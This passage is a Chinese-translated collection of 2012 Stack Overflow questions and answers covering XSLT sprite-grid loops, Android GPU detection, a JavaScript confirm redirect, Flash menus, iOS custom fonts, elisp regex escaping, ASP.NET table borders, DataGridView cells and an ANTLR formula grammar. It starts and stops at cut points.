<div style="background-position:-625px -375px;"><img src="images/thumbs/24.jpg" alt="24" /></div> 
```

我意识到我需要循环（不知何故）并保持计数（不知何故）并且已经看到了许多循环和计数示例，我希望这个过程是直截了当的，但后来我读到了`position()`很多`number`其他的东西，我的头脑在旋转。我不知道如何或在何处定位`for-each`语句中的计数循环，或者即使 a`for-each`是最佳解决方案。我的微弱尝试都没有产生格式良好的 XSL，因此您可以看到我没有快速获得任何地方。

所以这里希望这里的一位大师可以帮助我开始这个过程并帮助我理解 xslt。

图像数据来自 XML 文件，我能够毫无问题地处理 img src 和 alt，所以问题只是像素计算、循环、计数等

```
<xsl:for-each select="DATASET/ITEM">
<div style="background-position:-{rowpos}px -{colpos}px;"><img src="{thumbnailimage}" alt="{imagealttext}" /></div>
</xsl:for-each>
<!-- rowpos and colpos are the calculated values that are generated from whatever loop and count process is used --> 
```

所以为了澄清：

**计算。**有 3 个变量会产生 6 个计算值。tw=125。宽度用于背景位置，因此根据行/列计算值如示例中所示 - 例如 tw-tw、tw、tw*2、tw*3、tw*4 和 tw*5（总共6 次计算）。行数和列数使用计算的像素值确定每个缩略图的定位方式和位置 - 在上述情况下为 0px、-125px、-250px、-375px、-500px 和 -675px。

计算的进一步扩展：- 行和列的位置由缩略图的宽度决定。每个缩略图的位置由行数和列数决定。具有 150px 宽的缩略图的 3 行 x 3 列网格将需要 9 个缩略图，因此需要 9 组 px 值，但只需要 2 个唯一计算，例如 tw*2 和 tw*3，如下所示：-

```
<div style="background-position: -0px -0px;" /><img src="image 1.jpg" alt="Alt text 1" /></div>
<div style="background-position: -125px -0px;" /><img src="image 2.jpg" alt="Alt text 2" /></div>
<div style="background-position: -250px -0px;" /><img src="image 3.jpg" alt="Alt text 3" /></div>
<div style="background-position: -375px -0px;" /><img src="image 4.jpg" alt="Alt text 4" /></div>
<div style="background-position: -500px -0px;" /><img src="image 5.jpg" alt="Alt text 5" /></div>
<div style="background-position: -0px -125px;" /><img src="image 6.jpg" alt="Alt text 6" /></div>
<div style="background-position: -125px -125px;" /><img src="image 7.jpg" alt="Alt text 7" /></div>
<div style="background-position: -250px -125px;" /><img src="image 8.jpg" alt="Alt text 8" /></div>
<div style="background-position: -375px -125px;" /><img src="image 9.jpg" alt="Alt text 9" /></div>
<div style="background-position: -500px -125px;" /><img src="image 10.jpg" alt="Alt text 10" /></div>
<div style="background-position: -0px -250px;" /><img src="image 11.jpg" alt="Alt text 11" /></div>
<div style="background-position: -125px -250px;" /><img src="image 12.jpg" alt="Alt text 12" /></div>
<div style="background-position: -250px -250px;" /><img src="image 13.jpg" alt="Alt text 13" /></div>
<div style="background-position: -375px -250px;" /><img src="image 14.jpg" alt="Alt text 14" /></div>
<div style="background-position: -500px -250px;" /><img src="image 15.jpg" alt="Alt text 15" /></div>
<div style="background-position: -0px -375px;" /><img src="image 16.jpg" alt="Alt text 16" /></div>
<div style="background-position: -125px -375px;" /><img src="image 17.jpg" alt="Alt text 17" /></div>
<div style="background-position: -250px -375px;" /><img src="image 18.jpg" alt="Alt text 18" /></div>
<div style="background-position: -375px -375px;" /><img src="image 19.jpg" alt="Alt text 19" /></div>
<div style="background-position: -500px -375px;" /><img src="image 20.jpg" alt="Alt text 20" /></div> 
```

**XML 文件**图像 src 和 alt 文本来自 XML 文件：-

```
<DATASET>
<ITEM>
   <THUMBNAILIMAGE>image1.jpg</THUMBNAILIMAGE>
   <IMAGEALTTEXT>Alt text 1</IMAGEALTTEXT>
</ITEM>
<ITEM>
   <THUMBNAILIMAGE>image2.jpg</THUMBNAILIMAGE>
   <IMAGEALTTEXT>Alt text 2</IMAGEALTTEXT>
</ITEM>
......
<ITEM>
   <THUMBNAILIMAGE>image20.jpg</THUMBNAILIMAGE>
   <IMAGEALTTEXT>Alt text 20</IMAGEALTTEXT>
</ITEM>
</DATASET> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T14:57:26.313

我认为这可以使用下面的代码（**XSLT 1.0**）来完成。以下转换应与任何 XML 文件一起使用。

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" 
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:xs="http://www.w3.org/2001/XMLSchema">

<xsl:output indent="yes" />

<xsl:variable name="TW">125</xsl:variable>
<xsl:variable name="ROWS">4</xsl:variable>
<xsl:variable name="COLS">6</xsl:variable>
<xsl:variable name="TOTAL"><xsl:value-of select="$ROWS * $COLS"/></xsl:variable>

<xsl:template match="/">
    <xsl:call-template name="iterate_rows" />
</xsl:template>

<xsl:template name="iterate_rows">
    <xsl:param name="num">0</xsl:param> 

    <xsl:if test="not($num = $ROWS)">
        <xsl:call-template name="iterate_cols">
            <xsl:with-param name="rows" select="$num"/>
        </xsl:call-template>

        <xsl:call-template name="iterate_rows">
            <xsl:with-param name="num" select="$num + 1"/>
        </xsl:call-template>
    </xsl:if>
</xsl:template>

<xsl:template name="iterate_cols">
    <xsl:param name="num">0</xsl:param> 
    <xsl:param name="rows" />

    <xsl:if test="not($num = $COLS)">
        <xsl:element name="div">
            <xsl:attribute name="style" ><xsl:value-of select="concat('background-position:-', $TW*$num, 'px -', $TW*$rows, 'px;')" /></xsl:attribute>

            <xsl:variable name="number" select="$rows*$COLS + $num + 1" />

            <xsl:element name="img">
                <xsl:attribute name="src">
                    <xsl:value-of select="concat('images/thumbs/', $number, '.jpg')"/>
                </xsl:attribute>
                <xsl:attribute name="alt">
                    <xsl:value-of select="$number"/>
                </xsl:attribute>
            </xsl:element>

        </xsl:element>

        <xsl:call-template name="iterate_cols">
            <xsl:with-param name="num" select="$num + 1"/>
            <xsl:with-param name="rows" select="$rows" />
        </xsl:call-template>
    </xsl:if>
</xsl:template>

</xsl:stylesheet> 
```

**编辑：**

在 XSLT 中，不可能构造类似于 C++ 或 Java 中的循环，因为不可能更改变量的值（因此不可能有计数器）。但是可以用重复来代替迭代。

在我的解决方案中，我定义了两个经常调用的模板——第一个是 named `iterate_rows`，而第二个是`iterate_cols`. 整个“程序”的入口点是：

```
<xsl:template match="/">
    <xsl:call-template name="iterate_rows" />
</xsl:template> 
```

这首先被调用。命名模板`iterate_rows`有一个参数`num`，它的默认值设置为 0。重要的是`<xsl:if ...>`检查我们是否已经到达循环末尾的条件（在这种情况下，它的值是`$ROWS`）。在条件块内部，我们有两个调用：一个执行`iterate_cols`模板，第二个是对`iterate_rows`模板本身的调用（注意：我们用递增的参数调用它`num`）。第二个模板以类似的方式工作。希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T18:03:03.900

在 XSLT 2.0 中，这很简单：类似于：

```
<xsl:for-each select="1 to $rows">
  <xsl:variable name="row" select="position()"/>
  <xsl:for-each select="1 to $columns">
     <xsl:variable name="column" select="position()"/>
     <div style="background-position: -{$row*$tw}px -{$column*$tw}px"/>
  </
</ 
```

在 1.0 中，您没有使用`select="1 to $rows"`，但流行的解决方法是使用`select="(//*)[position() &lt;= $rows]"`，只要源文档中至少有 $rows 元素，它就可以工作。您实际上对选择的节点并不感兴趣，只对它们中有多少感兴趣，这决定了您执行循环的次数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T20:10:27.783

**这是一个完整、更短、更简单（只有一个递归模板）的递归 XSLT 1.0 转换**：

```
<xsl:stylesheet version="1.0"
     xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
     <xsl:output omit-xml-declaration="yes" indent="yes"/>

     <xsl:param name="pTw" select="125"/>
     <xsl:param name="pNumRows" select="4"/>
     <xsl:param name="pNumCols" select="5"/>

     <xsl:variable name="vImageItems" select="/*/*"/>

     <xsl:template match="/">
      <xsl:call-template name="generateDiv"/>
     </xsl:template>

     <xsl:template name="generateDiv">
      <xsl:param name="pRow" select="1"/>
      <xsl:param name="pCol" select="1"/>

      <xsl:if test="not($pRow > $pNumRows)">
        <xsl:variable name="vImageItem" select=
        "$vImageItems[($pRow -1)*$pNumCols + $pCol]"/>

        <div style="background-position: -{($pCol -1)*$pTw}px -{($pRow -1)*$pTw}px;">
          <img src="{$vImageItem/THUMBNAILIMAGE}"
               alt="{$vImageItem/IMAGEALTTEXT}" />
        </div>

        <xsl:variable name="vnewCol">
         <xsl:choose>
          <xsl:when test="$pCol = $pNumCols">1</xsl:when>
          <xsl:otherwise><xsl:value-of select="$pCol+1"/></xsl:otherwise>
         </xsl:choose>
        </xsl:variable>

        <xsl:variable name="vnewRow">
          <xsl:choose>
            <xsl:when test="$vnewCol = 1"><xsl:value-of select="$pRow+1"/></xsl:when>
            <xsl:otherwise><xsl:value-of select="$pRow"/></xsl:otherwise>
          </xsl:choose>
        </xsl:variable>

        <xsl:call-template name="generateDiv">
         <xsl:with-param name="pRow" select="$vnewRow"/>
         <xsl:with-param name="pCol" select="$vnewCol"/>
        </xsl:call-template>
      </xsl:if>
     </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时**：

```
<DATASET>
    <ITEM>
        <THUMBNAILIMAGE>image1.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 1</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image2.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 2</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image3.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 3</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image4.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 4</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image5.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 5</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image6.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 6</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image7.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 7</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image8.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 8</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image9.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 9</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image10.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 10</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image11.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 11</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image12.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 12</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image13.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 13</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image14.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 14</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image15.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 15</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image16.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 16</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image17.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 17</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image18.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 18</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image19.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 19</IMAGEALTTEXT>
    </ITEM>
    <ITEM>
        <THUMBNAILIMAGE>image20.jpg</THUMBNAILIMAGE>
        <IMAGEALTTEXT>Alt text 20</IMAGEALTTEXT>
    </ITEM>
</DATASET> 
```

**产生了想要的正确结果：**

```
<div style="background-position: -0px -0px;">
   <img src="image1.jpg" alt="Alt text 1"/>
</div>
<div style="background-position: -125px -0px;">
   <img src="image2.jpg" alt="Alt text 2"/>
</div>
<div style="background-position: -250px -0px;">
   <img src="image3.jpg" alt="Alt text 3"/>
</div>
<div style="background-position: -375px -0px;">
   <img src="image4.jpg" alt="Alt text 4"/>
</div>
<div style="background-position: -500px -0px;">
   <img src="image5.jpg" alt="Alt text 5"/>
</div>
<div style="background-position: -0px -125px;">
   <img src="image6.jpg" alt="Alt text 6"/>
</div>
<div style="background-position: -125px -125px;">
   <img src="image7.jpg" alt="Alt text 7"/>
</div>
<div style="background-position: -250px -125px;">
   <img src="image8.jpg" alt="Alt text 8"/>
</div>
<div style="background-position: -375px -125px;">
   <img src="image9.jpg" alt="Alt text 9"/>
</div>
<div style="background-position: -500px -125px;">
   <img src="image10.jpg" alt="Alt text 10"/>
</div>
<div style="background-position: -0px -250px;">
   <img src="image11.jpg" alt="Alt text 11"/>
</div>
<div style="background-position: -125px -250px;">
   <img src="image12.jpg" alt="Alt text 12"/>
</div>
<div style="background-position: -250px -250px;">
   <img src="image13.jpg" alt="Alt text 13"/>
</div>
<div style="background-position: -375px -250px;">
   <img src="image14.jpg" alt="Alt text 14"/>
</div>
<div style="background-position: -500px -250px;">
   <img src="image15.jpg" alt="Alt text 15"/>
</div>
<div style="background-position: -0px -375px;">
   <img src="image16.jpg" alt="Alt text 16"/>
</div>
<div style="background-position: -125px -375px;">
   <img src="image17.jpg" alt="Alt text 17"/>
</div>
<div style="background-position: -250px -375px;">
   <img src="image18.jpg" alt="Alt text 18"/>
</div>
<div style="background-position: -375px -375px;">
   <img src="image19.jpg" alt="Alt text 19"/>
</div>
<div style="background-position: -500px -375px;">
   <img src="image20.jpg" alt="Alt text 20"/>
</div> 
```

**说明**：

1.  **这是一个递归解决方案**。如果保证迭代次数不超过可用节点的总数（在源 XML 文档和 XSLT 样式表中），则可以使用非递归解决方案（又名**[Piez 方法）。](http://www.dpawson.co.uk/xsl/sect2/muench.html#d9944e300)**

2.  **停止条件**：当前行号值变得大于参数指定的行数（`$pRow > $pNumRows`）。

3.  **操作**：生成必要的新`div`元素，然后获取用于执行下一个操作的列号和行号的值。**

# android - 在 Android 中确定 GPU 存在的最简单方法是什么？

> ID：10862782
> 
> 赞同：1
> 
> 时间：2012-06-02T13:47:26.957
> 
> 标签：android, opengl-es, gpu

在我的应用程序中，我根据 GPU 的存在以不同的方式渲染图像（当有 GPU 时使用 OpenGL）。

目前我有一个配置选项。

但我希望我的应用程序通过某种方法自动检测 GPU 的存在，一些快速测试。我认为没有直接的 API 允许这样做。但是，那应该进行什么测试呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T17:23:47.150

它不像布尔值那么容易，但你可以尝试像

```
glGetString(GL_VENDOR);
glGetString(GL_RENDERER); 
```

并尝试根据已知的 GPU 供应商列表来确定它。这是 OpenGL 手册页必须说的：

> 由于 GL 不包括对实现的性能特征的查询，因此编写了一些应用程序以识别已知平台并根据这些平台的已知性能特征修改其 GL 使用。字符串 GL_VENDOR 和 GL_RENDERER 一起唯一地指定一个平台。它们不会因版本而异，应由平台识别算法使用。

举个例子，我的设备返回：

```
Vendor:   NVIDIA Corporation
Renderer: NVIDIA Tegra 
```

# javascript - 重定向确认为真

> ID：10862786
> 
> 赞同：1
> 
> 时间：2012-06-02T13:47:39.437
> 
> 标签：javascript, jquery, confirm

我想让它让用户点击一个链接，他们会得到一个确认框。如果他们点击 OK，他们会被发送到一个新的 php 函数。

我试过了：

```
function confirmReset() {
 var r = confirm('Are you sure?');
 var url = window.location.pathname;
 var pathArray = url.split('/');
 var host = pathArray[1];
 var newHost = '/headquarters/designReset';

 if (r == true) {
    window.location = host + newHost;
    //document.location.href = '/headquarters/designReset';
 } else {
    alert('it didnt work');
 }
 return false;
}​ 
```

萤火虫错误说：

SyntaxError: 非法字符
}â€‹</p>

就是说 â€‹ 在函数末尾的 } 之后。我从外部获取此脚本，因此如果您发布答案，请确保它在外部有效。不只是在 html 文件本身。我有没有答案。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T13:52:41.247

没有`string`方法。它给出了一个错误。还可以考虑添加`return false`到您的函数中以防止默认链接操作。

*HTML：*

```
<a href="#" onclick="return confirmReset();">Test</a>​ 
```

*JavaScript：*

```
function confirmReset() {
    var r = confirm('Are you sure?');
    var url = window.location.pathname;
    var pathArray = url.split('/');        // <-- no need in "string()"
    var host = pathArray[1];
    var newHost = '/headquarters/designReset';

    if (r == true) {
        window.location = host + newHost;
        //document.location.href = '/headquarters/designReset';
    } else {
        alert('it didnt work');
    }
    return false;                          // <-- add this line
}​ 
```

**演示：http:** [//jsfiddle.net/xKhaq/](http://jsfiddle.net/xKhaq/)

# flash - 如何实现主菜单？

> ID：10862787
> 
> 赞同：0
> 
> 时间：2012-06-02T13:47:41.503
> 
> 标签：flash, flash-cs5

我必须创建一个项目，让学生能够玩 4 个交互式简单游戏。当他们打开 Flash 文件时，会出现带有 4 个按钮的菜单。每个按钮打开对应的游戏。

我不明白。我应该在第 1 帧上有 4 个按钮，然后单击第一个按钮然后转到第 2 帧吗？

或者我应该创建一个 5 个不同的项目（菜单、游戏 1、游戏 n）。如果是这样，那么我该如何连接它们？

我该如何实施？任何提示表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-03T11:11:15.233

mgraph 谢谢你的回复。我实际上已经设法在 CS6 中使用 AIR 解决了这个问题。

关于发布：将 flash 项目导出为 AIR 应用程序。

关于菜单：将菜单放在第 1 帧，将游戏 1 放在第 2 帧。确保游戏 1 是影片剪辑。

谢谢你。

# objective-c - 自定义 UIFont 为零

> ID：10862791
> 
> 赞同：0
> 
> 时间：2012-06-02T13:48:18.843
> 
> 标签：objective-c, ios, xcode, fonts, uifont

我正在实现自定义字体。这是我的代码：

```
 UIFont *font = [UIFont fontWithName: @"FlipboardFont" size: 41.0];

if (font) {

    NSLog(@"Font non-zero and ready for use!");
    label.font = font;

} 
```

所有变量都设置正确，而且，我已经检查了该站点上的几乎每个链接。这里也列出了我做过的事情：

在plist中“应用程序提供的字体”数组的0项中添加了字体名称+扩展名作为键值

部署目标构建设置不会比版本 3.2 更早。

字体包含在构建目标中（在“复制捆绑资源”构建阶段）

“应用程序提供的字体”键的原始值是 UIAppFonts。

但是，它仍然不起作用。显然，我的日志永远不会被调用。有什么可做的？

更新：

好的，所以我尝试了kevboh的建议。在 FontBook 中，我发现字体的名称与“Helvetica Neue”不同，然后有一个带有不同选项的下拉列表，我想要浓缩的粗体，所以我尝试了：

```
 UIFont *font = [UIFont fontWithName: @"Helvetica Neue Condensed Bold" size: 41.0]; 
```

但仍然没有运气:(

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T13:53:28.607

使用 FontBook 打开字体并确保您在`fontWithName`: 中使用了正确的名称，请参见此处：[UIFont with custom font failed with Nil](https://stackoverflow.com/questions/9047230/uifont-with-custom-font-fails-with-nil)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T14:08:35.060

我的问题在于从不安装我的字体，我在 Font Book 中这样做了，现在我可以选择在 .xib 文件中这样做。一切都是好的！

# emacs - 在 elisp 中，正则表达式 [\\]documentclass 和 \\documentclass 之间有区别吗？

> ID：10862797
> 
> 赞同：1
> 
> 时间：2012-06-02T13:48:49.657
> 
> 标签：emacs, elisp

我正在使用**rx**函数从**ELISP**中的**sexps**生成正则表达式，但不知道如何生成用于 org-export-latex-classes的正则表达式*“\\documentclass” ：*

```
 (rx "\\documentclass")
    (rx "\\" "documentclass")
    (rx (char "\\") "documentclass") 
```

评估时分别给出以下输出：

```
 "\\\\documentclass"
    "\\\\documentclass"
    "[\\]documentclass" 
```

*“\\documentclass”*是否等同于*“[\\]documentclass”*？---我认为是，但不确定。我可以使用 rx 生成前者吗？

编辑：虽然这个问题是有效的，但我意识到我的动机不是；因为 org-export-latex-classes 使用字符串而不是正则表达式。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T16:33:52.867

Emacs 需要`\`在字符串的双引号*读取语法*中进行转义，因此，当*lisp 阅读器*处理代码时，计算结果为包含单个字符`"\\"`的字符串*对象*`\`；因此，单个反斜杠是正则表达式引擎在使用该字符串对象时看到的内容。

但是，正则`\`表达式中的 a*也*具有转义功能，这意味着正则`\\`表达式中的序列匹配单个`\`.

为了表示`\\`Emacs 字符串（读取语法）中的序列，每个反斜杠本身都必须通过在其前面加上反斜杠来进行转义。

因此`"\\\\"`计算为一个字符串，其中包含`\\`可以用作匹配单个`\`.

但是，在正则表达式*字符替代*序列中，反斜杠不会被转义；因此`[\]`，由 string 表示`"[\\]"`，匹配单个反斜杠 - 该单字符集的唯一可能匹配项。

所以用作正则表达式，字符串`"\\\\"`和`"[\\]"`匹配一样东西。

作为正则表达式的字符串实际上与没有反斜杠的字符串`"\\documentclass"`相同，因为它是在正则表达式中被转义的字符串（这是有效的，但当然是不必要的）。`"documentclass"``d`

elisp 手册对此进行了如下解释：

```
`\' has two functions: it quotes the special characters (including
`\'), and it introduces additional special constructs.

Because `\' quotes special characters, `\$' is a regular
expression that matches only `$', and `\[' is a regular expression
that matches only `[', and so on.

Note that `\' also has special meaning in the read syntax of Lisp
strings (*note String Type::), and must be quoted with `\'.  For
example, the regular expression that matches the `\' character is
`\\'.  To write a Lisp string that contains the characters `\\',
Lisp syntax requires you to quote each `\' with another `\'.
Therefore, the read syntax for a regular expression matching `\'
is `"\\\\"'.

[...]

As a `\' is not special inside a character alternative, it can never
remove the special meaning of `-' or `]'.  So you should not quote
these characters when they have no special meaning either.  This would
not clarify anything, since backslashes can legitimately precede these
characters where they _have_ special meaning, as in `[^\]' (`"[^\\]"'
for Lisp string syntax), which matches any single character except a
backslash. 
```

`C-h``i``g` `(elisp) Regexp Special` `RET`

# c# - asp.net 表格边框

> ID：10862800
> 
> 赞同：0
> 
> 时间：2012-06-02T13:48:57.420
> 
> 标签：c#, asp.net, border

我需要为我的每个 asp:table 列添加右边框（我有 3 个跨栏）。以下代码适用于表格，但仅在整个表格周围放置边框：

```
style="border-left: 3px solid blue; border-right: 3px solid blue" 
```

如何将其添加到列并定义自定义颜色？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T16:51:10.360

pOcHa 为所有分配了类的表获得了它。

要为特定的命名表定义样式，您可以使用 ID 选择器：

```
/* Just named tables */
#Table1 td{ border-right:2px solid #00F;} 
```

CSS 文件：

```
/* All tables */
table td{ border-right:2px solid #00F;}

/* All tables with Rightborders class */
table.Rightborders td{ border-right:2px solid #00F;}

/* Just named tables */
#Table1 td{ border-right:2px solid #00F;} 
```

代码：

```
<%@ Page Language="C#" AutoEventWireup="true"  CodeFile="Default.aspx.cs" Inherits="_Default" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <link href="Styles.css" rel="stylesheet" type="text/css" />
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:Table ID="Table1" CssClass="Rightborders" runat="server">
        <asp:TableRow>
        <asp:TableCell>1</asp:TableCell>
        <asp:TableCell>2</asp:TableCell>
        <asp:TableCell>3</asp:TableCell>
        </asp:TableRow>
        </asp:Table>
    </div>
    </form>
</body>
</html> 
```

-J

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T15:55:23.207

只需将一个`RightBorders`CSS 类添加到您的表中，然后像这样定义它：

```
table.RightBorders td { border-right: 1px solid "custom color" } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T17:27:25.240

```
<style type="text/css">
    .tablecell
    {
        border-right:3px solid #bbb;
    }
</style>

<asp:Table ID="Table1" runat="server">
    <asp:TableRow>
        <asp:TableCell CssClass="tablecell">c1</asp:TableCell>
        <asp:TableCell CssClass="tablecell">c2</asp:TableCell>
    </asp:TableRow>
    <asp:TableRow>
        <asp:TableCell CssClass="tablecell">c1</asp:TableCell>
        <asp:TableCell CssClass="tablecell">c2</asp:TableCell>
    </asp:TableRow>
</asp:Table> 
```

# c# - 以编程方式编辑 DataGridViewCell 中的文本

> ID：10862801
> 
> 赞同：1
> 
> 时间：2012-06-02T13:48:57.560
> 
> 标签：c#, .net, winforms, datagrid, datagridview

我需要编辑 DataGridViewCell 的文本。具体来说，我需要将文本从更改`-1`为`"N/A"`

首先我尝试了这个：

```
dgResults.Rows[0].Cells[0].Value = "N/A"; 
```

但它在运行时抱怨：

![在此处输入图像描述](../Images/6fbda968a33645d1688386fc8e6d8301.png)

之后，我尝试更改列的数据类型：

```
dTable.Columns[0].DataType = System.Type.GetType("System.String"); 
```

我得到这个错误：

```
Cannot change DataType of a column once it has data. 
```

我无权访问数据库，也无法修改它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:22:48.720

您可以通过处理[CellFormatting](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridview.cellformatting.aspx)事件来做到这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:54:16.843

为什么要更改数据表的数据类型？为什么不更改 dgv 的列类型？尝试这个：

```
dgResults.Columns[0].ValueType = typeof(string);
dgResults.Rows[0].Cells[0].Value = "N/A"; 
```

使用适当的列索引

# antlr - ANTLR ActionScript 到 Java 问题

> ID：10862802
> 
> 赞同：1
> 
> 时间：2012-06-02T13:49:00.147
> 
> 标签：antlr

真的希望有人可以帮助解决这个问题。我一直在使用 Robert Stehwien 的 ANTLR 脚本来为类似公式的 excel 创建 AST。

[http://arcanecoder.blogspot.co.uk/2008/04/using-antlr-to-create-excel-like.html](http://arcanecoder.blogspot.co.uk/2008/04/using-antlr-to-create-excel-like.html)

虽然生成的代码在作为 ActionScript 运行时看起来很好，但当我移植到 Java 时，我发现了一个有趣的小问题。

以下公式的树是“+”而不是“(+ 1 2)”。这是我能找到的最简单的情况，但是其他公式也无法创建正确的树。

> (1 + 2)

但是，以下工作正常：

> 1 + 2

有什么想法可能导致这种情况吗？提前谢谢了！！

为下面的代码转储道歉，我不确定我还能如何简单地解释这个问题。这是我用来提取树字符串的代码：

```
ANTLRStringStream input = new ANTLRStringStream("(1 + 2)");

FormulaLexer lexer = new FormulaLexer(input);
CommonTokenStream tokenStream = new CommonTokenStream(lexer);
FormulaParser parser = new FormulaParser(tokenStream);

ParserRuleReturnScope scope = parser.formula();
CommonTree expressionTree = (CommonTree) scope.getTree();

System.out.println(expressionTree.toStringTree()); 
```

这是最终的 ANTLR 脚本。这几乎与原始版本相同，但删除了 ActionScript 选项：

```
/*
Originally written by Robert Stehwien
*/

grammar Formula;

options {
    output=AST;
    ASTLabelType=CommonTree;
}

tokens {
    POS;
    NEG;
    CALL;
}

@package {com.arcanearcade.antlr}
@lexer::package {com.arcanearcade.antlr}

formula
    : (EQ!)? expression
    ;

//The highest precedence expression is the most deeply nested
//Precedence ties are parsed left to right
//Expression starts with the lowest precedece rule
expression      
    : boolExpr
    ;
boolExpr
    : concatExpr ((AND | OR | LT | LTEQ | GT | GTEQ | EQ | NOTEQ)^ concatExpr)*
    ;
concatExpr
    : sumExpr (CONCAT^ sumExpr)*
    ;
sumExpr
    : productExpr ((SUB | ADD)^ productExpr)*
    ;
productExpr
    : expExpr ((DIV | MULT)^ expExpr)*
    ;
expExpr
    : unaryOperation (EXP^ unaryOperation)*
    ;
unaryOperation
    : NOT^ operand
    | ADD o=operand -> ^(POS $o)
    | SUB o=operand -> ^(NEG $o)
    | operand
    ;
// the highest precedence rule uses operand
operand
    : literal 
    | functionExpr -> ^(CALL functionExpr)
    | percent
    | VARIABLE
    | LPAREN expression RPAREN -> ^(expression)
    ;
functionExpr
    : FUNCNAME LPAREN! (expression (COMMA! expression)*)? RPAREN!
    ;
literal
    : NUMBER 
    | STRING 
    | TRUE
    | FALSE
    ;
percent
    : NUMBER PERCENT^
    ;

STRING
    :
    '\"'
        ( options {greedy=false;}
        : ESCAPE_SEQUENCE
        | ~'\\'
        )*
    '\"'
    ;
WHITESPACE
    : (' ' | '\n' | '\t' | '\r')+ {skip();};
TRUE
    : ('t'|'T')('r'|'R')('u'|'U')('e'|'E')
    ;
FALSE
    : ('f'|'F')('a'|'A')('l'|'L')('s'|'S')('e'|'E')
    ;

NOTEQ           : '<>';
LTEQ            : '<=';
GTEQ            : '>=';
AND             : '&&';
OR              : '||';
NOT             : '!';
EQ              : '=';
LT              : '<';
GT              : '>';

EXP             : '^';
MULT            : '*';
DIV             : '/';
ADD             : '+';
SUB             : '-';

CONCAT          : '&';

LPAREN          : '(';
RPAREN          : ')';
COMMA           : ',';
PERCENT         : '%';

VARIABLE
    : '[' ~('[' | ']')+ ']'
    ;
FUNCNAME
    : (LETTER)+
    ;
NUMBER
    : (DIGIT)+ ('.' (DIGIT)+)?
    ;

fragment
LETTER 
    : ('a'..'z') | ('A'..'Z')
    ;
fragment
DIGIT
    : ('0'..'9')
    ;
fragment
ESCAPE_SEQUENCE
    : '\\' 't'
    | '\\' 'n'
    | '\\' '\"'
    | '\\' '\''
    | '\\' '\\'
    ; 
```

* * *

## 回答 #1

> 赞同：1
> 
